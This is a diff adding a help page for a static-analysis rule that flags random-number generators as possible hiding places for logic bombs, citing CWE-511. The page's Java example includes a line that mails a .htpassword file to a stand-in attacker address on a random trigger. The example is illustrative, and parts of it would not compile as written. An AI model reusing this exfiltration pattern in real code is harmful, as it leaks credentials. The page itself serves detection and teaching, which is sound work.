@@ -1,0 +1,94 @@
+<HTML>
+<HEAD>
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+<LINK REL="stylesheet" HREF="book.css" TYPE="text/css">
+<TITLE>
+Inspect 'Random' objects or 'Math.random()' methods that could indicate areas where malicious code has been placed [SECURITY.WSC.RDM]
+</TITLE>
+</HEAD>
+<BODY BGCOLOR=#FFFFFF>
+<STRONG>
+Inspect 'Random' objects or 'Math.random()' methods that could indicate areas where malicious code has been placed [SECURITY.WSC.RDM]
+</STRONG>
+<p>
+<BR><BR>
+<STRONG>
+DESCRIPTION
+</STRONG>
+<PRE>
+
+
+This rule identifies 'Random' objects or 'Math.random()'
+methods. A message is reported for each occurrence.
+
+
+
+</PRE>
+<STRONG>
+SINCE
+</STRONG>
+<PRE>
+
+v6.0
+
+
+
+</PRE>
+<STRONG>
+SECURITY RELEVANCE
+</STRONG>
+<PRE>
+
+category: Weak Security Controls
+category: Malicious Code
+
+Random number generators might indicate areas where
+malicious code has been placed. Inspect the code around
+random number generators for security issues related to
+unusual behavior.
+
+
+
+
+</PRE>
+<STRONG>
+EXAMPLE
+</STRONG>
+<PRE>
+
+package examples.rules.security.wsc;
+
+public class RDM {
+    public String createSecurityKey(int range){
+       long rnd= Math.random(); // VIOLATION
+       if (rnd &lt; .001) {
+           Runtime.exec( "sendmail .htpassword hacker@crackatoa.us" );
+       }
+    }
+}
+
+
+
+</PRE>
+<STRONG>
+REPAIR
+</STRONG>
+<PRE>
+
+Carefully examine places where 'Random' objects are being 
+used and verify that they do not contain malicious code.
+
+
+
+</PRE>
+<STRONG>
+REFERENCES
+</STRONG>
+<PRE>
+
+CWE-511: Logic/Time Bomb
+<A HREF="https://cwe.mitre.org/data/definitions/511.html">https://cwe.mitre.org/data/definitions/511.html</A>
+
+</PRE>
+</BODY>
+</HTML>
